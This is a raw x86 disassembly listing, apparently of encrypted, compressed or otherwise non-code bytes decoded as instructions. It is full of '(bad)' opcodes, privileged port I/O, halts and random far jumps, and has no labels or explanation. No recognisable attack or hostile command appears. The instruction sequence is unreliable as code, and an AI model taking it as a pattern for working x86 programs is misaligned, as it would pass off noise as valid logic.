  41a2e4:	addr16 jnp 0x41a27b
  41a2e7:	stos   BYTE PTR es:[edi],al
  41a2e8:	jecxz  0x41a332
  41a2ea:	js     0x41a35d
  41a2ec:	pop    ecx
  41a2ed:	pop    ss
  41a2ee:	sahf   
  41a2ef:	nop
  41a2f0:	repz in eax,0xfa
  41a2f3:	out    dx,eax
  41a2f4:	(bad)  
  41a2f6:	aad    0xd7
  41a2f8:	aam    0xae
  41a2fa:	popa   
  41a2fb:	(bad)  
  41a2fc:	pop    esp
  41a2fd:	mov    edi,eax
  41a2ff:	push   eax
  41a300:	nop
  41a301:	jmp    0x41a346
  41a303:	pop    ebp
  41a304:	inc    ebp
  41a305:	jne    0x41a33d
  41a307:	nop
  41a308:	jecxz  0x41a28a
  41a30a:	sbb    eax,0x8f46713a
  41a30f:	lds    edi,FWORD PTR [ecx+0x18ebf353]
  41a315:	add    al,0xf4
  41a317:	jb     0x41a34a
  41a319:	(bad)  
  41a31a:	lea    ecx,[ecx-0x78]
  41a31d:	call   0x38a5004e
  41a322:	imul   esi,edx,0x398cd567
  41a328:	dec    ebx
  41a329:	test   eax,0xe3e35551
  41a32e:	jae    0x41a31f
  41a330:	sbb    BYTE PTR [edx+0x3f351fc5],al
  41a336:	lods   al,BYTE PTR ds:[esi]
  41a337:	push   ds
  41a338:	sbb    eax,0x7d885c3
  41a33d:	xchg   ebx,eax
  41a33e:	shr    DWORD PTR [eax],0x26
  41a341:	dec    eax
  41a342:	jae    0x41a33d
  41a344:	adc    eax,0x77ef1d4a
  41a349:	ficomp DWORD PTR [edi+ebx*4]
  41a34c:	addr16 (bad) 
  41a34e:	cmp    al,BYTE PTR [ecx+ebp*8]
  41a351:	pop    ecx
  41a353:	adc    dh,ah
  41a355:	or     ch,BYTE PTR [ebx+0x3dfd25c4]
  41a35b:	(bad)  
  41a35c:	xchg   ecx,eax
  41a35d:	out    0xc2,al
  41a35f:	or     esp,DWORD PTR [edi-0x1e]
  41a362:	xor    DWORD PTR [eax-0x74ffa1ab],ebx
  41a368:	call   0xf9d5cc8d
  41a36d:	add    ecx,DWORD PTR [edi+0x5a]
  41a370:	cmp    ch,BYTE PTR [ebx-0x54]
  41a373:	or     edx,ecx
  41a375:	mov    ch,0xe0
  41a377:	daa    
  41a378:	lods   eax,DWORD PTR ds:[esi]
  41a379:	sub    ah,ch
  41a37b:	adc    esi,DWORD PTR [esi-0xb1be8da]
  41a381:	test   eax,0x6f0a8752
  41a386:	mov    dh,0xa2
  41a388:	addr16 nop
  41a38a:	(bad)  
  41a38b:	out    0xbd,al
  41a38d:	nop
  41a38e:	dec    DWORD PTR [edx+0x41]
  41a391:	dec    edi
  41a392:	call   0x372ff072
  41a397:	xchg   al,bl
  41a399:	sbb    esp,DWORD PTR cs:[ebp+0xd]
  41a39d:	and    ch,BYTE PTR [edi-0x43178115]
  41a3a3:	sahf   
  41a3a4:	ret    0x4daf
  41a3a7:	sub    DWORD PTR [edx],0x9a7ac1c8
  41a3ad:	or     BYTE PTR [ebx+0x6c7fc6c1],dl
  41a3b3:	(bad)  
  41a3b5:	mov    bl,0xe9
  41a3b7:	test   al,0xc6
  41a3b9:	adc    al,0xe7
  41a3bb:	cmp    DWORD PTR [esi-0x6],0xf4dbeeed
  41a3c2:	jl     0x41a3af
  41a3c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a3c5:	sub    ebp,DWORD PTR [edx]
  41a3c7:	sbb    cl,BYTE PTR [esi-0x5d]
  41a3ca:	cmp    BYTE PTR [ebx+0x60],dl
  41a3cd:	imul   ebp,DWORD PTR [ebx],0xcc806c7e
  41a3d3:	push   esp
  41a3d4:	aaa    
  41a3d5:	aas    
  41a3d6:	mov    dl,0xbe
  41a3d8:	int    0xc2
  41a3da:	dec    ebp
  41a3db:	adc    BYTE PTR ds:0x4ee54b58,cl
  41a3e1:	stc    
  41a3e2:	mov    al,0xf7
  41a3e4:	push   ss
  41a3e5:	lods   eax,DWORD PTR es:[esi]
  41a3e7:	fs (bad) 
  41a3e9:	push   ss
  41a3ea:	scas   eax,DWORD PTR es:[edi]
  41a3eb:	stos   BYTE PTR es:[edi],al
  41a3ec:	push   eax
  41a3ed:	loop   0x41a3b6
  41a3ef:	outs   dx,DWORD PTR ds:[esi]
  41a3f0:	sbb    BYTE PTR [ebx],dl
  41a3f2:	int3   
  41a3f3:	mov    edx,0xdcc6a464
  41a3f8:	fsub   DWORD PTR [ebp+esi*4-0x38]
  41a3fc:	mov    BYTE PTR [edx],0x1c
  41a3ff:	test   DWORD PTR [esi-0x58180f90],ebx
  41a405:	aas    
  41a406:	adc    ah,BYTE PTR [ebp+0x58]
  41a409:	aas    
  41a40a:	scas   al,BYTE PTR es:[edi]
  41a40b:	(bad)  
  41a40c:	push   ds
  41a40d:	call   0xa05e:0x26d76f75
  41a414:	push   ebx
  41a415:	jno    0x41a3c8
  41a417:	nop
  41a418:	cmp    al,0xb6
  41a41a:	ss pop ds
  41a41c:	dec    ebp
  41a41d:	push   edi
  41a41e:	pop    ds
  41a41f:	fdivr  QWORD PTR [edi]
  41a421:	test   al,0x28
  41a423:	(bad)  
  41a425:	xchg   BYTE PTR [edi+0x4b],bh
  41a428:	ret    
  41a429:	sub    edi,DWORD PTR [ecx]
  41a42b:	in     eax,dx
  41a42c:	ss dec esi
  41a42e:	push   es
  41a42f:	inc    ecx
  41a430:	fucom  st(5)
  41a432:	xchg   edx,eax
  41a433:	adc    bl,BYTE PTR [ebp-0x72dbdcee]
  41a439:	mov    edi,0x59c2c7fe
  41a43e:	pop    ds
  41a43f:	aam    0xf8
  41a441:	inc    edx
  41a442:	xor    DWORD PTR [ebp+0x9646a6a],edx
  41a448:	sbb    bh,BYTE PTR [ebx+0x62]
  41a44b:	test   cl,bh
  41a44d:	mov    ebx,0xdb49f2bd
  41a452:	mov    esp,0xa46bef39
  41a457:	sahf   
  41a458:	cmp    DWORD PTR [edi+0x3a],eax
  41a45b:	or     BYTE PTR [edi],ch
  41a45d:	fldenv [edi]
  41a45f:	add    BYTE PTR ds:0x68ee37db,0xbd
  41a466:	mov    al,0x58
  41a468:	dec    esi
  41a469:	leave  
  41a46a:	sahf   
  41a46b:	mov    BYTE PTR ds:0x333912d1,al
  41a471:	and    ecx,ebp
  41a473:	inc    ecx
  41a474:	mov    dh,0x82
  41a476:	icebp  
  41a477:	mov    ah,0x19
  41a479:	add    eax,edi
  41a47b:	cdq    
  41a47c:	xor    bl,ah
  41a47e:	xchg   edx,eax
  41a47f:	push   es
  41a480:	sub    DWORD PTR [ecx+0x4a1c5b5f],edi
  41a486:	fiadd  WORD PTR [edx+ebx*8+0x1f]
  41a48a:	jnp    0x41a4d0
  41a48c:	mov    ebp,0x64e6d2d8
  41a491:	bound  ebp,QWORD PTR [edi-0x57]
  41a494:	jl     0x41a47a
  41a496:	into   
  41a497:	fsubr  st(4),st
  41a499:	popf   
  41a49a:	inc    ebp
  41a49b:	mov    dh,0xaf
  41a49d:	xor    BYTE PTR [ebx+edi*4-0x7a157ff5],cl
  41a4a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a4a5:	outs   dx,BYTE PTR ds:[esi]
  41a4a6:	sbb    DWORD PTR [ecx+edi*8-0x72],0xff4c9f5f
  41a4ae:	bound  ebp,QWORD PTR [ecx]
  41a4b0:	enter  0xf56b,0xdd
  41a4b4:	sbb    al,0x4a
  41a4b6:	cmc    
  41a4b7:	mov    ds:0xaf1dee7d,eax
  41a4bc:	xchg   esp,eax
  41a4bd:	add    eax,0x94c018a4
  41a4c2:	es stos DWORD PTR es:[edi],eax
  41a4c4:	std    
  41a4c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a4c6:	jl     0x41a4c9
  41a4c8:	fdiv   DWORD PTR ds:0xe0264eca
  41a4ce:	call   0xa43e6ac7
  41a4d3:	xor    BYTE PTR [eax+0x40f46186],0xad
  41a4da:	test   dh,al
  41a4dc:	jp     0x41a4e7
  41a4de:	outs   dx,DWORD PTR ds:[esi]
  41a4df:	push   esi
  41a4e0:	pushf  
  41a4e1:	arpl   WORD PTR [edi+0x65],cx
  41a4e4:	dec    eax
  41a4e5:	dec    esi
  41a4e6:	inc    edx
  41a4e7:	dec    esp
  41a4e8:	inc    ebx
  41a4e9:	mov    esp,0xc208fe7c
  41a4ee:	sub    eax,0x2d51e815
  41a4f3:	nop
  41a4f4:	sti    
  41a4f5:	inc    esp
  41a4f6:	pop    esi
  41a4f7:	inc    eax
  41a4f8:	cmp    ah,dh
  41a4fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a4fb:	jge    0x41a4c0
  41a4fd:	(bad)  
  41a4fe:	jbe    0x41a4c1
  41a500:	mov    bl,0xa1
  41a502:	dec    ecx
  41a503:	add    BYTE PTR [esi-0x2609cfa2],cl
  41a509:	xor    al,0xcf
  41a50b:	adc    bl,BYTE PTR [eax-0x7]
  41a50e:	clc    
  41a50f:	or     DWORD PTR ds:0x16c1e01a,edi
  41a515:	mov    edx,0xc5f82c73
  41a51a:	call   0x95787d24
  41a51f:	mov    edx,0x675783cf
  41a524:	cmp    ch,BYTE PTR ds:0x5a496387
  41a52a:	mov    al,ds:0x9779637
  41a52f:	jp     0x41a56c
  41a531:	xchg   ecx,eax
  41a532:	into   
  41a533:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a534:	stos   BYTE PTR es:[edi],al
  41a535:	sbb    BYTE PTR [edx+edx*1+0x63d80acf],al
  41a53c:	inc    edi
  41a53d:	xor    DWORD PTR [eax],ebx
  41a53f:	and    al,0x6d
  41a541:	and    al,0xd2
  41a543:	fist   DWORD PTR ds:0x3cebc10b
  41a549:	mov    edi,0xf722163d
  41a54e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a54f:	dec    esp
  41a550:	dec    eax
  41a551:	or     BYTE PTR [ecx+0x9c2df69],bh
  41a557:	int3   
  41a558:	dec    esi
  41a559:	fld    st(1)
  41a55b:	and    bh,BYTE PTR [ebp+edx*2+0x18e11b82]
  41a562:	(bad)  
  41a563:	int3   
  41a564:	rcr    DWORD PTR [ebx-0x6ce490b8],0xb2
  41a56b:	xchg   DWORD PTR [edi-0x15],ebx
  41a56e:	or     BYTE PTR [edx-0x18],0x3c
  41a572:	nop
  41a573:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a574:	inc    ecx
  41a575:	(bad)  
  41a577:	ss mov esi,0x1ae6b06b
  41a57d:	aam    0x4
  41a57f:	loope  0x41a58b
  41a581:	popf   
  41a582:	into   
  41a583:	cmp    DWORD PTR [edx+ebp*4+0x2376df77],ebp
  41a58a:	push   ecx
  41a58b:	shl    DWORD PTR [ebx+ecx*8-0x6ccb021b],0x88
  41a593:	mov    al,ds:0xd072a9bf
  41a598:	jo     0x41a560
  41a59a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a59b:	push   es
  41a59c:	xor    bl,BYTE PTR [ebx+0x34]
  41a59f:	sar    DWORD PTR ds:0xd05d0759,0x5
  41a5a6:	adc    ebx,esi
  41a5a8:	(bad)  
  41a5a9:	mov    al,0xfd
  41a5ab:	inc    edi
  41a5ac:	adc    bl,al
  41a5ae:	pop    ss
  41a5af:	dec    edx
  41a5b0:	mov    eax,ds:0xead7e46d
  41a5b5:	nop
  41a5b6:	pop    ebp
  41a5b7:	sub    al,0xad
  41a5b9:	pop    es
  41a5ba:	dec    edi
  41a5bb:	and    eax,0x1f685464
  41a5c0:	(bad)  
  41a5c1:	mov    ebp,0x64393e08
  41a5c6:	pop    ebp
  41a5c7:	fs cmc 
  41a5c9:	cmp    ah,al
  41a5cb:	pop    edx
  41a5cc:	cwde   
  41a5cd:	jmp    0x28bb:0x804f95b7
  41a5d4:	es stc 
  41a5d6:	std    
  41a5d7:	jo     0x41a636
  41a5d9:	out    dx,eax
  41a5da:	sbb    DWORD PTR [ebx+0x44],esp
  41a5dd:	in     eax,0x9f
  41a5df:	addr16 test al,0x2
  41a5e2:	cmp    DWORD PTR [ecx-0x344b4411],ecx
  41a5e8:	dec    edx
  41a5e9:	mov    ecx,0x761c8253
  41a5ee:	pusha  
  41a5ef:	adc    al,BYTE PTR [esi]
  41a5f1:	inc    esp
  41a5f2:	adc    al,0x59
  41a5f4:	mov    ecx,0x3ae12556
  41a5f9:	(bad)  
  41a5fa:	dec    ebx
  41a5fb:	push   0xffffffe9
  41a5fd:	jns    0x41a58c
  41a5ff:	sub    al,0xc
  41a601:	das    
  41a602:	sbb    ebp,ecx
  41a604:	push   esp
  41a605:	aas    
  41a606:	cmp    al,0xba
  41a608:	icebp  
  41a609:	mov    eax,0xb846c423
  41a60e:	push   0x3b
  41a610:	sub    bh,BYTE PTR [eax]
  41a612:	jle    0x41a668
  41a614:	les    edx,FWORD PTR [ebx+0x9]
  41a617:	cmp    DWORD PTR [edi+0x74],esi
  41a61a:	sub    edx,ecx
  41a61c:	gs push ss
  41a61e:	test   eax,0x25d79ad5
  41a623:	xchg   edx,eax
  41a624:	xchg   edx,eax
  41a625:	sbb    eax,0x14213214
  41a62a:	push   0xb90e59f3
  41a62f:	pop    es
  41a630:	mov    edi,0x6b614821
  41a635:	dec    esi
  41a636:	adc    eax,0x8a4283f6
  41a63b:	push   cs
  41a63c:	ds ds or ah,bl
  41a640:	sti    
  41a641:	fisttp QWORD PTR [ecx+0x6b]
  41a644:	jnp    0x41a67b
  41a646:	fild   WORD PTR [esi]
  41a648:	or     cl,dh
  41a64a:	pop    edx
  41a64b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a64c:	stos   BYTE PTR es:[edi],al
  41a64d:	jno    0x41a63a
  41a64f:	lock fs imul edx,esi,0x21
  41a654:	xlat   BYTE PTR ds:[ebx]
  41a655:	sbb    BYTE PTR [esi-0x258fb1a2],cl
  41a65b:	inc    edx
  41a65c:	pop    ecx
  41a65d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a65e:	mov    WORD PTR [eax+0x27941da4],gs
  41a664:	dec    ecx
  41a665:	ins    BYTE PTR es:[edi],dx
  41a666:	add    DWORD PTR [ebx+0x53d76b56],edx
  41a66c:	xchg   BYTE PTR [esi],bh
  41a66e:	pusha  
  41a66f:	aad    0x6b
  41a671:	dec    esp
  41a672:	rcl    DWORD PTR [ecx],0xb8
  41a675:	cs call 0x6231bcfb
  41a67b:	outs   dx,BYTE PTR ds:[esi]
  41a67c:	adc    DWORD PTR [edx+0x10eca3d9],esp
  41a682:	dec    ebx
  41a683:	pop    ds
  41a684:	mov    cl,0xbc
  41a686:	jmp    0x476a:0x334f32b1
  41a68d:	xor    al,0x17
  41a68f:	sbb    al,0x23
  41a691:	rcr    ebp,0x34
  41a694:	fisubr WORD PTR [ebp-0x4aa4899]
  41a69a:	arpl   WORD PTR [esi-0x75],di
  41a69d:	and    esi,DWORD PTR [eax]
  41a69f:	mov    ebp,0x7527a6f5
  41a6a4:	loope  0x41a710
  41a6a6:	loope  0x41a703
  41a6a8:	fcom   st(0)
  41a6aa:	push   0xffffffce
  41a6ac:	int3   
  41a6ad:	xchg   ebx,eax
  41a6ae:	les    edi,FWORD PTR [ecx-0x593da0b8]
  41a6b4:	ror    BYTE PTR [ecx+0x7f],cl
  41a6b7:	int3   
  41a6b8:	js     0x41a706
  41a6ba:	inc    BYTE PTR [ebx]
  41a6bc:	push   cs
  41a6bd:	and    bl,dl
  41a6bf:	inc    ecx
  41a6c0:	or     BYTE PTR [edx-0x18],0xa5
  41a6c4:	repnz cs mov al,0x4e
  41a6c8:	xor    eax,0x85eda612
  41a6cd:	popf   
  41a6ce:	pop    ds
  41a6cf:	loop   0x41a6a1
  41a6d1:	ins    DWORD PTR es:[edi],dx
  41a6d2:	cmp    dl,ah
  41a6d4:	sbb    edi,DWORD PTR [edx]
  41a6d6:	dec    ebp
  41a6d7:	into   
  41a6d8:	pop    ebx
  41a6d9:	adc    al,0x94
  41a6db:	sahf   
  41a6dc:	mov    eax,0x378e00fb
  41a6e1:	dec    BYTE PTR [edi]
  41a6e3:	mov    dh,0x3
  41a6e5:	mov    dh,0x94
  41a6e7:	fld    TBYTE PTR [edx+0x12]
  41a6ea:	das    
  41a6eb:	das    
  41a6ec:	push   edi
  41a6ed:	xor    eax,0x462fdf23
  41a6f2:	push   ss
  41a6f3:	push   0x4ca92633
  41a6f8:	sub    DWORD PTR [edx],ebx
  41a6fa:	jmp    0x41a766
  41a6fc:	mov    eax,0x9a398643
  41a701:	mov    DWORD PTR [ecx+0x6b],eax
  41a704:	sbb    ebp,DWORD PTR [eax+0x8]
  41a707:	ror    edi,cl
  41a709:	dec    edi
  41a70a:	xor    cl,ch
  41a70c:	cwde   
  41a70d:	dec    eax
  41a70e:	fs and ah,0x42
  41a712:	addr16 ja 0x41a734
  41a715:	cmp    ebp,DWORD PTR [esi]
  41a717:	push   ds
  41a718:	jnp    0x41a69b
  41a71a:	pop    eax
  41a71b:	or     eax,0x613dc3e2
  41a720:	fisub  WORD PTR [esi-0x2b]
  41a723:	imul   ebp,DWORD PTR [eax+0x505d58c],0xffffffe0
  41a72a:	rol    DWORD PTR [edi],1
  41a72c:	xor    DWORD PTR [esi+0x40],0x3adb8070
  41a733:	loope  0x41a6b9
  41a735:	cmp    esi,DWORD PTR [edi+0x25050fae]
  41a73b:	adc    al,0x53
  41a73d:	mov    eax,ds:0xdfedce9b
  41a742:	dec    esi
  41a743:	sbb    BYTE PTR [edi+ecx*8-0x73],bh
  41a747:	int3   
  41a748:	cwde   
  41a749:	outs   dx,DWORD PTR ds:[esi]
  41a74a:	fnstcw WORD PTR [ecx]
  41a74c:	outs   dx,BYTE PTR ds:[esi]
  41a74d:	mov    cl,0xd0
  41a74f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a750:	repz clc 
  41a752:	pop    eax
  41a753:	inc    ebx
  41a754:	add    esi,ebx
  41a756:	sbb    cl,BYTE PTR [ebx-0x4b74d30]
  41a75c:	jge    0x41a707
  41a75e:	pop    es
  41a75f:	sbb    eax,0xdf2b4e11
  41a764:	xchg   esi,eax
  41a765:	jg     0x41a78d
  41a767:	and    ch,BYTE PTR [ecx+0x33]
  41a76a:	push   eax
  41a76b:	inc    ebx
  41a76c:	es dec esp
  41a76e:	lods   eax,DWORD PTR ds:[esi]
  41a76f:	je     0x41a796
  41a771:	aaa    
  41a772:	daa    
  41a773:	pushf  
  41a774:	arpl   WORD PTR [edi-0x50cc9658],ax
  41a77a:	mov    al,0xd5
  41a77c:	hlt    
  41a77d:	aam    0xca
  41a77f:	add    BYTE PTR [eax+0x32800927],cl
  41a785:	mov    ebp,0x772220a8
  41a78a:	mov    cl,0xa8
  41a78c:	call   0x4565:0xafed208b
  41a793:	nop
  41a794:	leave  
  41a795:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a796:	out    dx,eax
  41a797:	int    0x87
  41a799:	lods   eax,DWORD PTR ds:[esi]
  41a79a:	bound  eax,QWORD PTR [esi-0x5e]
  41a79d:	ja     0x41a739
  41a79f:	ss push edi
  41a7a1:	pop    ss
  41a7a2:	cmp    eax,0xdea691a2
  41a7a7:	scas   al,BYTE PTR es:[edi]
  41a7a8:	daa    
  41a7a9:	mov    es,WORD PTR [eax]
  41a7ab:	in     al,0xf3
  41a7ad:	ds int 0xbd
  41a7b0:	pop    ss
  41a7b1:	clc    
  41a7b2:	jp     0x41a7ba
  41a7b4:	xchg   ebx,eax
  41a7b5:	ret    
  41a7b6:	xor    DWORD PTR [ebp+0x26],eax
  41a7b9:	and    BYTE PTR [ebx],ch
  41a7bb:	shl    edi,0x70
  41a7be:	rol    DWORD PTR [edx],cl
  41a7c0:	outs   dx,DWORD PTR ds:[esi]
  41a7c1:	xchg   ebx,eax
  41a7c2:	fidivr DWORD PTR [edi-0x16780f67]
  41a7c8:	lahf   
  41a7c9:	je     0x41a7df
  41a7cb:	sub    esi,DWORD PTR [edi+edi*1+0x4b]
  41a7cf:	in     al,dx
  41a7d0:	pop    eax
  41a7d1:	jbe    0x41a827
  41a7d3:	es jmp 0x41a80a
  41a7d6:	cli    
  41a7d7:	jno    0x41a7a6
  41a7d9:	push   si
  41a7db:	es and al,0xad
  41a7de:	and    ecx,DWORD PTR [eax-0x1c6d60ed]
  41a7e4:	jecxz  0x41a7c7
  41a7e6:	bound  eax,QWORD PTR [edx]
  41a7e8:	jb     0x41a7f3
  41a7ea:	sub    DWORD PTR [edi-0x13],esp
  41a7ed:	dec    eax
  41a7ee:	fs xchg esp,eax
  41a7f0:	outs   dx,DWORD PTR ds:[esi]
  41a7f1:	jecxz  0x41a7b9
  41a7f3:	test   BYTE PTR [edi+0x22],al
  41a7f6:	sti    
  41a7f7:	jmp    esp
  41a7f9:	(bad)  
  41a7fa:	aaa    
  41a7fb:	out    0xe6,al
  41a7fd:	mov    ecx,0x3d97ae52
  41a802:	inc    esi
  41a803:	cdq    
  41a804:	inc    edi
  41a805:	adc    DWORD PTR [edx-0x5d],0x8b73eb7e
  41a80c:	sub    eax,0x5db65e2c
  41a811:	push   ecx
  41a812:	jmp    0x41a7e1
  41a814:	sub    al,0xc8
  41a816:	rcr    DWORD PTR [edi+0xf390a67],1
  41a81c:	jmp    0x3b33:0xdea2f03
  41a823:	and    ebp,DWORD PTR [ebp+0x2da32a31]
  41a829:	cld    
  41a82a:	lds    esp,FWORD PTR [ebx]
  41a82c:	add    DWORD PTR [ecx+0x3c],esp
  41a82f:	outs   dx,DWORD PTR ds:[esi]
  41a830:	dec    ebp
  41a831:	hlt    
  41a832:	add    al,0x1c
  41a834:	loope  0x41a7f5
  41a836:	fs mov ebp,ecx
  41a839:	mov    DWORD PTR [eax+eiz*4],edi
  41a83c:	jg     0x41a899
  41a83e:	daa    
  41a83f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a840:	jg     0x41a85e
  41a842:	jecxz  0x41a80b
  41a844:	leave  
  41a845:	or     edx,0x5d9aeb4d
  41a84b:	scas   al,BYTE PTR es:[edi]
  41a84c:	popa   
  41a84d:	into   
  41a84e:	stos   BYTE PTR es:[edi],al
  41a84f:	adc    eax,0x11757b0e
  41a854:	into   
  41a855:	fnstsw WORD PTR [esi+0x26]
  41a858:	nop
  41a859:	shr    DWORD PTR [ebp+0x29],0x9f
  41a85d:	(bad)  
  41a85e:	and    al,0x97
  41a860:	adc    al,BYTE PTR [ebp-0x760f008b]
  41a866:	imul   edx,DWORD PTR [eax+0x10fe7de5],0xffffffdb
  41a86d:	pushf  
  41a86e:	mov    ebx,0xe4ccf010
  41a873:	jg     0x41a8a2
  41a875:	gs push ebx
  41a877:	adc    BYTE PTR [edi*2-0x1d8100e5],0x19
  41a87f:	pushf  
  41a880:	pop    ebx
  41a881:	js     0x41a8e9
  41a883:	repz ds aaa 
  41a886:	popa   
  41a887:	fsub   st(7),st
  41a889:	enter  0x781b,0x6
  41a88d:	lock mov ds:0x2f75143b,eax
  41a893:	push   0x1a
  41a895:	pop    esp
  41a896:	push   ds
  41a897:	out    0xb4,eax
  41a899:	cmp    dh,BYTE PTR [esi]
  41a89b:	dec    esi
  41a89c:	mov    ebp,0xa2e5d7cb
  41a8a1:	push   0xffffffb2
  41a8a3:	cmp    BYTE PTR [ebx-0x52],ah
  41a8a6:	mov    dh,0xd0
  41a8a8:	or     DWORD PTR [esp+esi*8-0xa],eax
  41a8ac:	xchg   ch,dh
  41a8ae:	in     al,0x70
  41a8b0:	mov    dl,0x1b
  41a8b2:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  41a8b4:	inc    ebp
  41a8b5:	mov    dh,0x7e
  41a8b7:	xchg   DWORD PTR [esi+0x5],ebp
  41a8ba:	repz and al,0x32
  41a8bd:	mov    ecx,0x88c7e483
  41a8c2:	aam    0xd2
  41a8c4:	in     eax,0x5a
  41a8c6:	jl     0x41a91e
  41a8c8:	cwde   
  41a8c9:	imul   edx,eax,0x1d
  41a8cc:	mov    eax,ds:0xe4b52bc
  41a8d1:	inc    edi
  41a8d2:	pop    ecx
  41a8d3:	cs sub al,0xbc
  41a8d6:	inc    esi
  41a8d7:	jmpw   0x49d4
  41a8db:	cmp    BYTE PTR [esp+eiz*4-0x50],0x60
  41a8e0:	pop    edx
  41a8e1:	push   ebx
  41a8e2:	cmp    eax,0x2791ad85
  41a8e7:	jg     0x41a948
  41a8e9:	jmp    0x41a883
  41a8eb:	mov    ah,0x1d
  41a8ed:	or     ecx,DWORD PTR [ecx]
  41a8ef:	stc    
  41a8f0:	outs   dx,DWORD PTR ds:[esi]
  41a8f1:	jb     0x41a938
  41a8f3:	outs   dx,BYTE PTR ds:[si]
  41a8f5:	sub    eax,ebp
  41a8f7:	ficomp WORD PTR [edi]
  41a8f9:	repz cmp al,BYTE PTR [ecx-0x35c32ca7]
  41a900:	scas   al,BYTE PTR es:[edi]
  41a901:	mov    cl,0x4e
  41a903:	pop    ss
  41a904:	pushf  
  41a905:	cli    
  41a906:	ins    BYTE PTR es:[edi],dx
  41a907:	loopne 0x41a8eb
  41a909:	sub    ah,dl
  41a90b:	add    edi,DWORD PTR [edx-0x70115d62]
  41a911:	pop    es
  41a912:	jmp    0xd660:0x8ac74ba6
  41a919:	xor    BYTE PTR [ecx],bl
  41a91b:	mov    edi,0xec14e261
  41a920:	popf   
  41a921:	push   0xfffffff2
  41a923:	mov    esi,0x5bec7e1b
  41a928:	(bad)  
  41a929:	push   ss
  41a92a:	jmp    0x5abdfa5e
  41a92f:	inc    esp
  41a930:	test   eax,0x8e404a45
  41a935:	bound  esp,QWORD PTR [ebx-0x485eb03f]
  41a93b:	outs   dx,DWORD PTR ds:[esi]
  41a93c:	into   
  41a93d:	shl    BYTE PTR [ecx+0x76bc9bb0],cl
  41a943:	jmp    0x55c2:0x4bd62f77
  41a94a:	pop    ecx
  41a94b:	mov    ecx,0x1653605a
  41a950:	sar    DWORD PTR [ebx+0x61],cl
  41a953:	or     eax,DWORD PTR [edx+0x3]
  41a956:	inc    edi
  41a957:	cs mov dl,0xaa
  41a95b:	xor    esp,DWORD PTR [edx]
  41a95d:	jp     0x41a9dc
  41a95f:	mov    bh,0xf9
  41a961:	sti    
  41a962:	push   ecx
  41a963:	mov    esi,cs
  41a965:	push   0x95684a34
  41a96a:	ins    BYTE PTR es:[edi],dx
  41a96b:	sub    BYTE PTR [edx+ecx*1],ch
  41a96e:	enter  0x6c3c,0xbf
  41a972:	push   eax
  41a973:	shl    BYTE PTR [edi+edx*2],1
  41a976:	and    dh,bl
  41a978:	ret    
  41a979:	or     eax,DWORD PTR [esi-0x29]
  41a97c:	in     al,dx
  41a97d:	fistp  QWORD PTR [ebx]
  41a97f:	pusha  
  41a980:	(bad)  
  41a981:	jmp    0x41a94b
  41a983:	sub    al,0xce
  41a985:	and    eax,0x1cba22b8
  41a98a:	mov    esi,0xaafc67b2
  41a98f:	adc    bl,BYTE PTR [eax-0x689f42aa]
  41a995:	mov    ah,0x4f
  41a997:	sub    esp,edi
  41a999:	jo     0x41a9af
  41a99b:	(bad)  
  41a99c:	(bad)  
  41a99d:	(bad)  
  41a99f:	(bad)  
  41a9a0:	repnz mov eax,0x505fdacf
  41a9a6:	pop    ecx
  41a9a7:	dec    edx
  41a9a8:	popf   
  41a9a9:	mov    DWORD PTR [esp+ecx*4],eax
  41a9ac:	or     esp,esi
  41a9ae:	shl    DWORD PTR [ebx+0x23aa6f15],cl
  41a9b4:	fs ja  0x41a971
  41a9b7:	adc    al,0x44
  41a9b9:	jecxz  0x41aa26
  41a9bb:	mov    esi,0x143a2999
  41a9c0:	adc    cl,BYTE PTR [eax-0x17a4ec5e]
  41a9c6:	push   0x1adf59fd
  41a9cb:	xchg   ecx,eax
  41a9cc:	out    0xb0,al
  41a9ce:	lds    esp,FWORD PTR [esi]
  41a9d0:	adc    bh,BYTE PTR [esp+eax*4-0x35]
  41a9d4:	(bad)  [ebp+0x5e]
  41a9d7:	cli    
  41a9d8:	fdiv   QWORD PTR [ebp+0x1a40f842]
  41a9de:	push   esi
  41a9df:	adc    edx,DWORD PTR [eax-0x60]
  41a9e2:	bound  ebx,QWORD PTR [edi+ecx*4+0x1e]
  41a9e6:	mov    esp,0xc23fd921
  41a9eb:	mov    ds:0xa72fc7a1,al
  41a9f0:	sti    
  41a9f1:	test   DWORD PTR [ecx+edi*2+0x79],0xca0e2ceb
  41a9f9:	ja     0x41a9b8
  41a9fb:	loopne 0x41aa6f
  41a9fd:	jae    0x41a9e6
  41a9ff:	dec    ecx
  41aa00:	cmp    eax,0x2714edde
  41aa05:	dec    ebx
  41aa06:	dec    BYTE PTR [ecx-0x19]
  41aa09:	xchg   ecx,eax
  41aa0a:	or     eax,0x8a7e236c
  41aa0f:	pushf  
  41aa10:	jne    0x41aa53
  41aa12:	in     al,dx
  41aa13:	mov    cl,0x1d
  41aa15:	ins    BYTE PTR es:[edi],dx
  41aa16:	xor    ebp,DWORD PTR [edi+0x29c49324]
  41aa1c:	das    
  41aa1d:	lock mul dl
  41aa20:	jne    0x41a9bc
  41aa22:	mov    ?,WORD PTR [ecx+0x36a0e0d3]
  41aa28:	fisub  WORD PTR [ebp+0x6f250760]
  41aa2e:	mov    eax,ds:0xd237666e
  41aa33:	or     ecx,DWORD PTR [edi+0x49]
  41aa36:	add    ecx,0xb82bc206
  41aa3c:	mov    ebp,DWORD PTR [ecx]
  41aa3e:	jmp    0x41aaa1
  41aa40:	ret    
  41aa41:	dec    esp
  41aa42:	lock inc edx
  41aa44:	pop    ebp
  41aa45:	in     eax,0xf
  41aa47:	push   edx
  41aa48:	out    0x76,eax
  41aa4a:	outs   dx,BYTE PTR ds:[esi]
